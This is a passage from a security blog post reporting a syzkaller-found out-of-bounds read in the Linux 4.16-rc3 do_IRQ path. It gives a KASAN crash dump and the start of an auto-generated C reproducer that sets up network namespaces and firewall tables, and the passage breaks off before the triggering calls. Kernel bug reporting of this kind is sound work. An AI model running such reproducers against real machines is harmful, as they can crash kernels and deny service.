---
layout: post
title: LK v4.16.x - do_irq - oobs
comments: true
---

do_irq - alloca Out Of Bounds

posted & found by [zer0day](https://kozistr.github.io/)

## tl;dr

Got from syzkaller & Found in LK v4.16.0-rc3. Only Call Trace (Dump).

Another meaningless one :)

## Call Trace (Dump)

Here's a dump.

```c
[  144.100193] BUG: KASAN: alloca-out-of-bounds in do_IRQ+0x14f/0x190
[  144.102273] Read of size 8 at addr ffff880071feef50 by task syz-executor7/3009
[  144.105120] 
[  144.105718] CPU: 0 PID: 3009 Comm: syz-executor7 Not tainted 4.16.0-rc3+ #5
[  144.108306] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014
[  144.111094] Call Trace:
[  144.111818]  <IRQ>
[  144.112451]  dump_stack+0x127/0x213
[  144.113456]  ? _atomic_dec_and_lock+0x18d/0x18d
[  144.115195]  ? show_regs_print_info+0x12/0x12
[  144.117092]  ? do_IRQ+0x14f/0x190
[  144.118988]  print_address_description+0x60/0x22b
[  144.121262]  ? do_IRQ+0x14f/0x190
[  144.122434]  kasan_report.cold.6+0xac/0x2f4
[  144.123688]  ? do_IRQ+0x14f/0x190
[  144.125633]  ? common_interrupt+0xf/0xf
[  144.128281]  </IRQ>
[  144.129024]  ? crypto_shash_update+0x23d/0x2a0
[  144.133518]  ? kasan_unpoison_shadow+0x4/0x40
[  144.134680]  ? crypto_shash_update+0x24d/0x2a0
[  144.135996]  ? ext4_inode_csum.isra.59+0x562/0xef0
[  144.137176]  ? ext4_journalled_zero_new_buffers+0x4e0/0x4e0
[  144.138826]  ? _rcu_barrier+0x1850/0x1d60
[  144.147204]  ? _cond_resched+0x10/0x20
[  144.148327]  ? _cond_resched+0x10/0x20
[  144.149289]  ? __getblk_gfp+0xf2/0xa30
[  144.150261]  ? save_trace+0x300/0x300
[  144.151229]  ? map_id_up+0x178/0x3a0
[  144.152122]  ? make_kprojid+0x30/0x30
[  144.152970]  ? lock_downgrade+0x6d0/0x6d0
[  144.153854]  ? find_held_lock+0x33/0x1b0
[  144.154777]  ? from_kprojid+0x89/0xc0
[  144.155620]  ? ext4_inode_csum_set+0x17c/0x370
[  144.156750]  ? ext4_mark_iloc_dirty+0x1709/0x2cc0
[  144.158064]  ? ext4_chunk_trans_blocks+0x20/0x20
[  144.159246]  ? jbd2_write_access_granted.part.8+0x264/0x410
[  144.163218]  ? jbd2_journal_file_inode+0x5d0/0x5d0
[  144.164486]  ? rcu_note_context_switch+0x710/0x710
[  144.165676]  ? jbd2_journal_get_write_access+0x98/0xb0
[  144.166916]  ? __ext4_journal_get_write_access+0x143/0x200
[  144.168336]  ? ext4_mark_inode_dirty+0x220/0xac0
[  144.169455]  ? ext4_evict_inode+0xb33/0x19d0
[  144.170611]  ? ext4_expand_extra_isize+0x560/0x560
[  144.171777]  ? __lock_is_held+0xad/0x140
[  144.172798]  ? ext4_xattr_ensure_credits+0x81/0x320
[  144.173967]  ? ext4_xattr_delete_inode+0x269/0xe20
[  144.175159]  ? ext4_evict_inode+0x8f6/0x19d0
[  144.176233]  ? ext4_expand_extra_isize_ea+0x1a20/0x1a20
[  144.177557]  ? __sb_start_write+0x16b/0x2f0
[  144.178698]  ? __sb_start_write+0x171/0x2f0
[  144.179765]  ? ext4_evict_inode+0xb33/0x19d0
[  144.180905]  ? ext4_da_write_begin+0x1170/0x1170
[  144.182053]  ? evict+0x45f/0x8f0
[  144.182904]  ? lock_acquire+0x4a0/0x4a0
[  144.183842]  ? wb_wakeup+0xc0/0xc0
[  144.184705]  ? do_raw_spin_trylock+0x190/0x190
[  144.185652]  ? bit_waitqueue+0x30/0x30
[  144.186414]  ? ext4_da_write_begin+0x1170/0x1170
[  144.187468]  ? evict+0x498/0x8f0
[  144.188398]  ? destroy_inode+0x1e0/0x1e0
[  144.189355]  ? iput+0x623/0xbc0
[  144.193860]  ? lock_acquire+0x4a0/0x4a0
[  144.202122]  ? rcu_read_lock_sched_held+0x102/0x120
[  144.203252]  ? ext4_drop_inode+0x11e/0x400
[  144.204290]  ? do_raw_spin_trylock+0x190/0x190
[  144.205489]  ? _atomic_dec_and_lock+0xff/0x18d
[  144.207104]  ? cpumask_local_spread+0x2c0/0x2c0
[  144.210166]  ? fsnotify_grab_connector+0x18c/0x2e0
[  144.212062]  ? iput+0x62b/0xbc0
[  144.213507]  ? ext4_sync_fs+0xa00/0xa00
[  144.215476]  ? dispose_list+0x390/0x390
[  144.220125]  ? fsnotify_grab_connector+0x1bd/0x2e0
[  144.223298]  ? fsnotify_recalc_mask.part.8+0xa0/0xa0
[  144.230135]  ? fsnotify_first_mark+0x340/0x340
[  144.231357]  ? dentry_unlink_inode+0x483/0x5b0
[  144.232384]  ? release_dentry_name_snapshot+0x70/0x70
[  144.233609]  ? lock_downgrade+0x6d0/0x6d0
[  144.234590]  ? rcutorture_record_progress+0x10/0x10
[  144.238561]  ? lock_acquire+0x4a0/0x4a0
[  144.239920]  ? do_raw_spin_lock+0x1b0/0x1b0
[  144.241197]  ? dput.part.24+0x23d/0x950
[  144.242177]  ? d_delete+0x1ed/0x2c0
[  144.243104]  ? vfs_rmdir+0x386/0x470
[  144.244475]  ? do_rmdir+0x41c/0x5b0
[  144.245746]  ? user_path_create+0x40/0x40
[  144.247270]  ? __do_page_fault+0x4a3/0xe30
[  144.248801]  ? exit_to_usermode_loop+0x16d/0x230
[  144.250478]  ? exit_to_usermode_loop+0x1c6/0x230
[  144.251700]  ? syscall_slow_exit_work+0x4d0/0x4d0
[  144.252955]  ? do_syscall_64+0xb0/0x850
[  144.254232]  ? SyS_mkdir+0x2c0/0x2c0
[  144.255074]  ? do_syscall_64+0x25b/0x850
[  144.255911]  ? exit_to_usermode_loop+0x1c6/0x230
[  144.257570]  ? syscall_return_slowpath+0x4e0/0x4e0
[  144.259317]  ? syscall_return_slowpath+0x342/0x4e0
[  144.261118]  ? entry_SYSCALL_64_after_hwframe+0x52/0xb7
[  144.263090]  ? trace_hardirqs_off_thunk+0x1a/0x1c
[  144.264816]  ? entry_SYSCALL_64_after_hwframe+0x42/0xb7
[  144.266695] 
[  144.267257] The buggy address belongs to the page:
[  144.268975] page:ffffea0001c7fb80 count:0 mapcount:0 mapping:0000000000000000 index:0x0
[  144.271861] flags: 0x500000000000000()
[  144.273191] raw: 0500000000000000 0000000000000000 0000000000000000 00000000ffffffff
[  144.275851] raw: ffffea0001c7fba0 ffffea0001c7fba0 0000000000000000 0000000000000000
[  144.278015] page dumped because: kasan: bad access detected
[  144.279598] 
[  144.280163] Memory state around the buggy address:
[  144.281388]  ffff880071feee00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
[  144.283488]  ffff880071feee80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
[  144.285237] >ffff880071feef00: 00 00 00 00 ca ca ca ca 02 cb cb cb cb cb cb cb
[  144.287223]                                                  ^
[  144.288617]  ffff880071feef80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
[  144.290465]  ffff880071fef000: 00 00 00 00 f1 f1 f1 f1 02 f2 f2 f2 f2 f2 f2 f2
[  144.292215] ==================================================================
[  144.296633] Disabling lock debugging due to kernel taint
[  144.297823] Kernel panic - not syncing: panic_on_warn set ...
```

## PoC

generated by syz-repro.

```c
#define _GNU_SOURCE

#include <endian.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <linux/futex.h>
#include <pthread.h>
#include <stdlib.h>
#include <errno.h>
#include <signal.h>
#include <stdarg.h>
#include <stdio.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <time.h>
#include <sys/prctl.h>
#include <dirent.h>
#include <sys/mount.h>
#include <errno.h>
#include <sched.h>
#include <signal.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdio.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <grp.h>
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/if.h>
#include <linux/if_ether.h>
#include <linux/if_tun.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <net/if_arp.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/uio.h>
#include <linux/net.h>
#include <netinet/in.h>
#include <sys/socket.h>

__attribute__((noreturn)) static void doexit(int status)
{
	volatile unsigned i;
	syscall(__NR_exit_group, status);
	for (i = 0;; i++) {
	}
}
#include <stdint.h>
#include <string.h>
#include <errno.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>

const int kFailStatus = 67;
const int kRetryStatus = 69;

  static void fail(const char* msg, ...)
{
	int e = errno;
	va_list args;
	va_start(args, msg);
	vfprintf(stderr, msg, args);
	va_end(args);
	fprintf(stderr, " (errno %d)\n", e);
	doexit((e == ENOMEM || e == EAGAIN) ? kRetryStatus : kFailStatus);
}

  static void exitf(const char* msg, ...)
{
	int e = errno;
	va_list args;
	va_start(args, msg);
	vfprintf(stderr, msg, args);
	va_end(args);
	fprintf(stderr, " (errno %d)\n", e);
	doexit(kRetryStatus);
}

static uint64_t current_time_ms()
{
	struct timespec ts;

	if (clock_gettime(CLOCK_MONOTONIC, &ts))
		fail("clock_gettime failed");
	return (uint64_t)ts.tv_sec * 1000 + (uint64_t)ts.tv_nsec / 1000000;
}

static void use_temporary_dir()
{
	char tmpdir_template[] = "./syzkaller.XXXXXX";
	char* tmpdir = mkdtemp(tmpdir_template);
	if (!tmpdir)
		fail("failed to mkdtemp");
	if (chmod(tmpdir, 0777))
		fail("failed to chmod");
	if (chdir(tmpdir))
		fail("failed to chdir");
}

static void vsnprintf_check(char* str, size_t size, const char* format, va_list args)
{
	int rv;

	rv = vsnprintf(str, size, format, args);
	if (rv < 0)
		fail("tun: snprintf failed");
	if ((size_t)rv >= size)
		fail("tun: string '%s...' doesn't fit into buffer", str);
}

static void snprintf_check(char* str, size_t size, const char* format, ...)
{
	va_list args;

	va_start(args, format);
	vsnprintf_check(str, size, format, args);
	va_end(args);
}

#define COMMAND_MAX_LEN 128
#define PATH_PREFIX "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin "
#define PATH_PREFIX_LEN (sizeof(PATH_PREFIX) - 1)

static void execute_command(bool panic, const char* format, ...)
{
	va_list args;
	char command[PATH_PREFIX_LEN + COMMAND_MAX_LEN];
	int rv;

	va_start(args, format);
	memcpy(command, PATH_PREFIX, PATH_PREFIX_LEN);
	vsnprintf_check(command + PATH_PREFIX_LEN, COMMAND_MAX_LEN, format, args);
	rv = system(command);
	if (panic && rv != 0)
		fail("tun: command \"%s\" failed with code %d", &command[0], rv);

	va_end(args);
}

static int tunfd = -1;
static int tun_frags_enabled;

#define SYZ_TUN_MAX_PACKET_SIZE 1000

#define TUN_IFACE "syz_tun"

#define LOCAL_MAC "aa:aa:aa:aa:aa:aa"
#define REMOTE_MAC "aa:aa:aa:aa:aa:bb"

#define LOCAL_IPV4 "172.20.20.170"
#define REMOTE_IPV4 "172.20.20.187"

#define LOCAL_IPV6 "fe80::aa"
#define REMOTE_IPV6 "fe80::bb"

#define IFF_NAPI 0x0010
#define IFF_NAPI_FRAGS 0x0020

static void initialize_tun(void)
{
	tunfd = open("/dev/net/tun", O_RDWR | O_NONBLOCK);
	if (tunfd == -1) {
		printf("tun: can't open /dev/net/tun: please enable CONFIG_TUN=y\n");
		printf("otherwise fuzzing or reproducing might not work as intended\n");
		return;
	}
	const int kTunFd = 252;
	if (dup2(tunfd, kTunFd) < 0)
		fail("dup2(tunfd, kTunFd) failed");
	close(tunfd);
	tunfd = kTunFd;

	struct ifreq ifr;
	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, TUN_IFACE, IFNAMSIZ);
	ifr.ifr_flags = IFF_TAP | IFF_NO_PI | IFF_NAPI | IFF_NAPI_FRAGS;
	if (ioctl(tunfd, TUNSETIFF, (void*)&ifr) < 0) {
		ifr.ifr_flags = IFF_TAP | IFF_NO_PI;
		if (ioctl(tunfd, TUNSETIFF, (void*)&ifr) < 0)
			fail("tun: ioctl(TUNSETIFF) failed");
	}
	if (ioctl(tunfd, TUNGETIFF, (void*)&ifr) < 0)
		fail("tun: ioctl(TUNGETIFF) failed");
	tun_frags_enabled = (ifr.ifr_flags & IFF_NAPI_FRAGS) != 0;

	execute_command(1, "sysctl -w net.ipv6.conf.%s.accept_dad=0", TUN_IFACE);

	execute_command(1, "sysctl -w net.ipv6.conf.%s.router_solicitations=0", TUN_IFACE);

	execute_command(1, "ip link set dev %s address %s", TUN_IFACE, LOCAL_MAC);
	execute_command(1, "ip addr add %s/24 dev %s", LOCAL_IPV4, TUN_IFACE);
	execute_command(1, "ip -6 addr add %s/120 dev %s", LOCAL_IPV6, TUN_IFACE);
	execute_command(1, "ip neigh add %s lladdr %s dev %s nud permanent",
			REMOTE_IPV4, REMOTE_MAC, TUN_IFACE);
	execute_command(1, "ip -6 neigh add %s lladdr %s dev %s nud permanent",
			REMOTE_IPV6, REMOTE_MAC, TUN_IFACE);
	execute_command(1, "ip link set dev %s up", TUN_IFACE);
}

#define DEV_IPV4 "172.20.20.%d"
#define DEV_IPV6 "fe80::%02hx"
#define DEV_MAC "aa:aa:aa:aa:aa:%02hx"

static void initialize_netdevices(void)
{
	unsigned i;
	const char* devtypes[] = {"ip6gretap", "bridge", "vcan", "bond", "veth"};
	const char* devnames[] = {"lo", "sit0", "bridge0", "vcan0", "tunl0",
				  "gre0", "gretap0", "ip_vti0", "ip6_vti0",
				  "ip6tnl0", "ip6gre0", "ip6gretap0",
				  "erspan0", "bond0", "veth0", "veth1"};

	for (i = 0; i < sizeof(devtypes) / (sizeof(devtypes[0])); i++)
		execute_command(0, "ip link add dev %s0 type %s", devtypes[i], devtypes[i]);
	execute_command(0, "ip link add dev veth1 type veth");
	for (i = 0; i < sizeof(devnames) / (sizeof(devnames[0])); i++) {
		char addr[32];
		snprintf_check(addr, sizeof(addr), DEV_IPV4, i + 10);
		execute_command(0, "ip -4 addr add %s/24 dev %s", addr, devnames[i]);
		snprintf_check(addr, sizeof(addr), DEV_IPV6, i + 10);
		execute_command(0, "ip -6 addr add %s/120 dev %s", addr, devnames[i]);
		snprintf_check(addr, sizeof(addr), DEV_MAC, i + 10);
		execute_command(0, "ip link set dev %s address %s", devnames[i], addr);
		execute_command(0, "ip link set dev %s up", devnames[i]);
	}
}

static int read_tun(char* data, int size)
{
	if (tunfd < 0)
		return -1;

	int rv = read(tunfd, data, size);
	if (rv < 0) {
		if (errno == EAGAIN)
			return -1;
		if (errno == EBADFD)
			return -1;
		fail("tun: read failed with %d", rv);
	}
	return rv;
}

static void flush_tun()
{
	char data[SYZ_TUN_MAX_PACKET_SIZE];
	while (read_tun(&data[0], sizeof(data)) != -1)
		;
}

static void loop();

static void sandbox_common()
{
	prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);
	setpgrp();
	setsid();

	struct rlimit rlim;
	rlim.rlim_cur = rlim.rlim_max = 128 << 20;
	setrlimit(RLIMIT_AS, &rlim);
	rlim.rlim_cur = rlim.rlim_max = 8 << 20;
	setrlimit(RLIMIT_MEMLOCK, &rlim);
	rlim.rlim_cur = rlim.rlim_max = 1 << 20;
	setrlimit(RLIMIT_FSIZE, &rlim);
	rlim.rlim_cur = rlim.rlim_max = 1 << 20;
	setrlimit(RLIMIT_STACK, &rlim);
	rlim.rlim_cur = rlim.rlim_max = 0;
	setrlimit(RLIMIT_CORE, &rlim);

#define CLONE_NEWCGROUP 0x02000000

	if (unshare(CLONE_NEWNS)) {
	}
	if (unshare(CLONE_NEWIPC)) {
	}
	if (unshare(CLONE_NEWCGROUP)) {
	}
	if (unshare(CLONE_NEWUTS)) {
	}
	if (unshare(CLONE_SYSVSEM)) {
	}
}

static int do_sandbox_setuid(void)
{
	if (unshare(CLONE_NEWPID))
		fail("unshare(CLONE_NEWPID)");
	int pid = fork();
	if (pid < 0)
		fail("sandbox fork failed");
	if (pid)
		return pid;

	sandbox_common();
	if (unshare(CLONE_NEWNET))
		fail("unshare(CLONE_NEWNET)");
	initialize_tun();
	initialize_netdevices();

	const int nobody = 65534;
	if (setgroups(0, NULL))
		fail("failed to setgroups");
	if (syscall(SYS_setresgid, nobody, nobody, nobody))
		fail("failed to setresgid");
	if (syscall(SYS_setresuid, nobody, nobody, nobody))
		fail("failed to setresuid");

	prctl(PR_SET_DUMPABLE, 1, 0, 0, 0);

	loop();
	doexit(1);
}

#define XT_TABLE_SIZE 1536
#define XT_MAX_ENTRIES 10

struct xt_counters {
	uint64_t pcnt, bcnt;
};

struct ipt_getinfo {
	char name[32];
	unsigned int valid_hooks;
	unsigned int hook_entry[5];
	unsigned int underflow[5];
	unsigned int num_entries;
	unsigned int size;
};

struct ipt_get_entries {
	char name[32];
	unsigned int size;
	void* entrytable[XT_TABLE_SIZE / sizeof(void*)];
};

struct ipt_replace {
	char name[32];
	unsigned int valid_hooks;
	unsigned int num_entries;
	unsigned int size;
	unsigned int hook_entry[5];
	unsigned int underflow[5];
	unsigned int num_counters;
	struct xt_counters* counters;
	char entrytable[XT_TABLE_SIZE];
};

struct ipt_table_desc {
	const char* name;
	struct ipt_getinfo info;
	struct ipt_replace replace;
};

static struct ipt_table_desc ipv4_tables[] = {
    {.name = "filter"},
    {.name = "nat"},
    {.name = "mangle"},
    {.name = "raw"},
    {.name = "security"},
};

static struct ipt_table_desc ipv6_tables[] = {
    {.name = "filter"},
    {.name = "nat"},
    {.name = "mangle"},
    {.name = "raw"},
    {.name = "security"},
};

#define IPT_BASE_CTL 64
#define IPT_SO_SET_REPLACE (IPT_BASE_CTL)
#define IPT_SO_GET_INFO (IPT_BASE_CTL)
#define IPT_SO_GET_ENTRIES (IPT_BASE_CTL + 1)

struct arpt_getinfo {
	char name[32];
	unsigned int valid_hooks;
	unsigned int hook_entry[3];
	unsigned int underflow[3];
	unsigned int num_entries;
	unsigned int size;
};

struct arpt_get_entries {
	char name[32];
	unsigned int size;
	void* entrytable[XT_TABLE_SIZE / sizeof(void*)];
};

struct arpt_replace {
	char name[32];
	unsigned int valid_hooks;
	unsigned int num_entries;
	unsigned int size;
	unsigned int hook_entry[3];
	unsigned int underflow[3];
	unsigned int num_counters;
	struct xt_counters* counters;
	char entrytable[XT_TABLE_SIZE];
};

struct arpt_table_desc {
	const char* name;
	struct arpt_getinfo info;
	struct arpt_replace replace;
};

static struct arpt_table_desc arpt_tables[] = {
    {.name = "filter"},
};

#define ARPT_BASE_CTL 96
#define ARPT_SO_SET_REPLACE (ARPT_BASE_CTL)
#define ARPT_SO_GET_INFO (ARPT_BASE_CTL)
#define ARPT_SO_GET_ENTRIES (ARPT_BASE_CTL + 1)

static void checkpoint_iptables(struct ipt_table_desc* tables, int num_tables, int family, int level)
{
	struct ipt_get_entries entries;
	socklen_t optlen;
	int fd, i;

	fd = socket(family, SOCK_STREAM, IPPROTO_TCP);
	if (fd == -1)
		fail("socket(%d, SOCK_STREAM, IPPROTO_TCP)", family);
	for (i = 0; i < num_tables; i++) {
		struct ipt_table_desc* table = &tables[i];
		strcpy(table->info.name, table->name);
		strcpy(table->replace.name, table->name);
		optlen = sizeof(table->info);
		if (getsockopt(fd, level, IPT_SO_GET_INFO, &table->info, &optlen)) {
			switch (errno) {
			case EPERM:
			case ENOENT:
			case ENOPROTOOPT:
				continue;
			}
			fail("getsockopt(IPT_SO_GET_INFO)");
		}
		if (table->info.size > sizeof(table->replace.entrytable))
			fail("table size is too large: %u", table->info.size);
		if (table->info.num_entries > XT_MAX_ENTRIES)
			fail("too many counters: %u", table->info.num_entries);
		memset(&entries, 0, sizeof(entries));
		strcpy(entries.name, table->name);
		entries.size = table->info.size;
		optlen = sizeof(entries) - sizeof(entries.entrytable) + table->info.size;
		if (getsockopt(fd, level, IPT_SO_GET_ENTRIES, &entries, &optlen))
			fail("getsockopt(IPT_SO_GET_ENTRIES)");
		table->replace.valid_hooks = table->info.valid_hooks;
		table->replace.num_entries = table->info.num_entries;
		table->replace.size = table->info.size;
		memcpy(table->replace.hook_entry, table->info.hook_entry, sizeof(table->replace.hook_entry));
		memcpy(table->replace.underflow, table->info.underflow, sizeof(table->replace.underflow));
		memcpy(table->replace.entrytable, entries.entrytable, table->info.size);
	}
	close(fd);
}

static void reset_iptables(struct ipt_table_desc* tables, int num_tables, int family, int level)
{
	struct xt_counters counters[XT_MAX_ENTRIES];
	struct ipt_get_entries entries;
	struct ipt_getinfo info;
	socklen_t optlen;
	int fd, i;

	fd = socket(family, SOCK_STREAM, IPPROTO_TCP);
	if (fd == -1)
		fail("socket(%d, SOCK_STREAM, IPPROTO_TCP)", family);
	for (i = 0; i < num_tables; i++) {
		struct ipt_table_desc* table = &tables[i];
		if (table->info.valid_hooks == 0)
			continue;
		memset(&info, 0, sizeof(info));
		strcpy(info.name, table->name);
		optlen = sizeof(info);
		if (getsockopt(fd, level, IPT_SO_GET_INFO, &info, &optlen))
			fail("getsockopt(IPT_SO_GET_INFO)");
		if (memcmp(&table->info, &info, sizeof(table->info)) == 0) {
			memset(&entries, 0, sizeof(entries));
			strcpy(entries.name, table->name);
			entries.size = table->info.size;
			optlen = sizeof(entries) - sizeof(entries.entrytable) + entries.size;
			if (getsockopt(fd, level, IPT_SO_GET_ENTRIES, &entries, &optlen))
				fail("getsockopt(IPT_SO_GET_ENTRIES)");
			if (memcmp(table->replace.entrytable, entries.entrytable, table->info.size) == 0)
				continue;
		}
		table->replace.num_counters = info.num_entries;
		table->replace.counters = counters;
		optlen = sizeof(table->replace) - sizeof(table->replace.entrytable) + table->replace.size;
		if (setsockopt(fd, level, IPT_SO_SET_REPLACE, &table->replace, optlen))
			fail("setsockopt(IPT_SO_SET_REPLACE)");
	}
	close(fd);
}

static void checkpoint_arptables(void)
{
	struct arpt_get_entries entries;
	socklen_t optlen;
	unsigned i;
	int fd;

	fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (fd == -1)
		fail("socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)");
	for (i = 0; i < sizeof(arpt_tables) / sizeof(arpt_tables[0]); i++) {
		struct arpt_table_desc* table = &arpt_tables[i];
		strcpy(table->info.name, table->name);
		strcpy(table->replace.name, table->name);
		optlen = sizeof(table->info);
		if (getsockopt(fd, SOL_IP, ARPT_SO_GET_INFO, &table->info, &optlen)) {
			switch (errno) {
			case EPERM:
			case ENOENT:
			case ENOPROTOOPT:
				continue;
			}
			fail("getsockopt(ARPT_SO_GET_INFO)");
		}
		if (table->info.size > sizeof(table->replace.entrytable))
			fail("table size is too large: %u", table->info.size);
		if (table->info.num_entries > XT_MAX_ENTRIES)
			fail("too many counters: %u", table->info.num_entries);
		memset(&entries, 0, sizeof(entries));
		strcpy(entries.name, table->name);
		entries.size = table->info.size;
		optlen = sizeof(entries) - sizeof(entries.entrytable) + table->info.size;
		if (getsockopt(fd, SOL_IP, ARPT_SO_GET_ENTRIES, &entries, &optlen))
			fail("getsockopt(ARPT_SO_GET_ENTRIES)");
		table->replace.valid_hooks = table->info.valid_hooks;
		table->replace.num_entries = table->info.num_entries;
		table->replace.size = table->info.size;
		memcpy(table->replace.hook_entry, table->info.hook_entry, sizeof(table->replace.hook_entry));
		memcpy(table->replace.underflow, table->info.underflow, sizeof(table->replace.underflow));
		memcpy(table->replace.entrytable, entries.entrytable, table->info.size);
	}
	close(fd);
}

static void reset_arptables()
{
	struct xt_counters counters[XT_MAX_ENTRIES];
	struct arpt_get_entries entries;
	struct arpt_getinfo info;
	socklen_t optlen;
	unsigned i;
	int fd;

	fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (fd == -1)
		fail("socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)");
	for (i = 0; i < sizeof(arpt_tables) / sizeof(arpt_tables[0]); i++) {
		struct arpt_table_desc* table = &arpt_tables[i];
		if (table->info.valid_hooks == 0)
			continue;
		memset(&info, 0, sizeof(info));
		strcpy(info.name, table->name);
		optlen = sizeof(info);
		if (getsockopt(fd, SOL_IP, ARPT_SO_GET_INFO, &info, &optlen))
			fail("getsockopt(ARPT_SO_GET_INFO)");
		if (memcmp(&table->info, &info, sizeof(table->info)) == 0) {
			memset(&entries, 0, sizeof(entries));
			strcpy(entries.name, table->name);
			entries.size = table->info.size;
			optlen = sizeof(entries) - sizeof(entries.entrytable) + entries.size;
			if (getsockopt(fd, SOL_IP, ARPT_SO_GET_ENTRIES, &entries, &optlen))
				fail("getsockopt(ARPT_SO_GET_ENTRIES)");
			if (memcmp(table->replace.entrytable, entries.entrytable, table->info.size) == 0)
				continue;
		}
		table->replace.num_counters = info.num_entries;
		table->replace.counters = counters;
		optlen = sizeof(table->replace) - sizeof(table->replace.entrytable) + table->replace.size;
		if (setsockopt(fd, SOL_IP, ARPT_SO_SET_REPLACE, &table->replace, optlen))
			fail("setsockopt(ARPT_SO_SET_REPLACE)");
	}
	close(fd);
}
#include <linux/if.h>
#include <linux/netfilter_bridge/ebtables.h>

struct ebt_table_desc {
	const char* name;
	struct ebt_replace replace;
	char entrytable[XT_TABLE_SIZE];
};

static struct ebt_table_desc ebt_tables[] = {
    {.name = "filter"},
    {.name = "nat"},
    {.name = "broute"},
};

static void checkpoint_ebtables(void)
{
	socklen_t optlen;
	unsigned i;
	int fd;

	fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (fd == -1)
		fail("socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)");
	for (i = 0; i < sizeof(ebt_tables) / sizeof(ebt_tables[0]); i++) {
		struct ebt_table_desc* table = &ebt_tables[i];
		strcpy(table->replace.name, table->name);
		optlen = sizeof(table->replace);
		if (getsockopt(fd, SOL_IP, EBT_SO_GET_INIT_INFO, &table->replace, &optlen)) {
			switch (errno) {
			case EPERM:
			case ENOENT:
			case ENOPROTOOPT:
				continue;
			}
			fail("getsockopt(EBT_SO_GET_INIT_INFO)");
		}
		if (table->replace.entries_size > sizeof(table->entrytable))
			fail("table size is too large: %u", table->replace.entries_size);
		table->replace.num_counters = 0;
		table->replace.entries = table->entrytable;
		optlen = sizeof(table->replace) + table->replace.entries_size;
		if (getsockopt(fd, SOL_IP, EBT_SO_GET_INIT_ENTRIES, &table->replace, &optlen))
			fail("getsockopt(EBT_SO_GET_INIT_ENTRIES)");
	}
	close(fd);
}

static void reset_ebtables()
{
	struct ebt_replace replace;
	char entrytable[XT_TABLE_SIZE];
	socklen_t optlen;
	unsigned i, j, h;
	int fd;

	fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (fd == -1)
		fail("socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)");
	for (i = 0; i < sizeof(ebt_tables) / sizeof(ebt_tables[0]); i++) {
		struct ebt_table_desc* table = &ebt_tables[i];
		if (table->replace.valid_hooks == 0)
			continue;
		memset(&replace, 0, sizeof(replace));
		strcpy(replace.name, table->name);
		optlen = sizeof(replace);
		if (getsockopt(fd, SOL_IP, EBT_SO_GET_INFO, &replace, &optlen))
			fail("getsockopt(EBT_SO_GET_INFO)");
		replace.num_counters = 0;
		for (h = 0; h < NF_BR_NUMHOOKS; h++)
			table->replace.hook_entry[h] = 0;
		if (memcmp(&table->replace, &replace, sizeof(table->replace)) == 0) {
			memset(&entrytable, 0, sizeof(entrytable));
			replace.entries = entrytable;
			optlen = sizeof(replace) + replace.entries_size;
			if (getsockopt(fd, SOL_IP, EBT_SO_GET_ENTRIES, &replace, &optlen))
				fail("getsockopt(EBT_SO_GET_ENTRIES)");
			if (memcmp(table->entrytable, entrytable, replace.entries_size) == 0)
				continue;
		}
		for (j = 0, h = 0; h < NF_BR_NUMHOOKS; h++) {
			if (table->replace.valid_hooks & (1 << h)) {
				table->replace.hook_entry[h] = (struct ebt_entries*)table->entrytable + j;
				j++;
			}
		}
		optlen = sizeof(table->replace) + table->replace.entries_size;
		if (setsockopt(fd, SOL_IP, EBT_SO_SET_ENTRIES, &table->replace, optlen))
			fail("setsockopt(EBT_SO_SET_ENTRIES)");
	}
	close(fd);
}

static void checkpoint_net_namespace(void)
{
	checkpoint_ebtables();
	checkpoint_arptables();
	checkpoint_iptables(ipv4_tables, sizeof(ipv4_tables) / sizeof(ipv4_tables[0]), AF_INET, SOL_IP);
	checkpoint_iptables(ipv6_tables, sizeof(ipv6_tables) / sizeof(ipv6_tables[0]), AF_INET6, SOL_IPV6);
}

static void reset_net_namespace(void)
{
	reset_ebtables();
	reset_arptables();
	reset_iptables(ipv4_tables, sizeof(ipv4_tables) / sizeof(ipv4_tables[0]), AF_INET, SOL_IP);
	reset_iptables(ipv6_tables, sizeof(ipv6_tables) / sizeof(ipv6_tables[0]), AF_INET6, SOL_IPV6);
}

static void remove_dir(const char* dir)
{
	DIR* dp;
	struct dirent* ep;
	int iter = 0;
retry:
	dp = opendir(dir);
	if (dp == NULL) {
		if (errno == EMFILE) {
			exitf("opendir(%s) failed due to NOFILE, exiting", dir);
		}
		exitf("opendir(%s) failed", dir);
	}
	while ((ep = readdir(dp))) {
		if (strcmp(ep->d_name, ".") == 0 || strcmp(ep->d_name, "..") == 0)
			continue;
		char filename[FILENAME_MAX];
		snprintf(filename, sizeof(filename), "%s/%s", dir, ep->d_name);
		struct stat st;
		if (lstat(filename, &st))
			exitf("lstat(%s) failed", filename);
		if (S_ISDIR(st.st_mode)) {
			remove_dir(filename);
			continue;
		}
		int i;
		for (i = 0;; i++) {
			if (unlink(filename) == 0)
				break;
			if (errno == EROFS) {
				break;
			}
			if (errno != EBUSY || i > 100)
				exitf("unlink(%s) failed", filename);
			if (umount2(filename, MNT_DETACH))
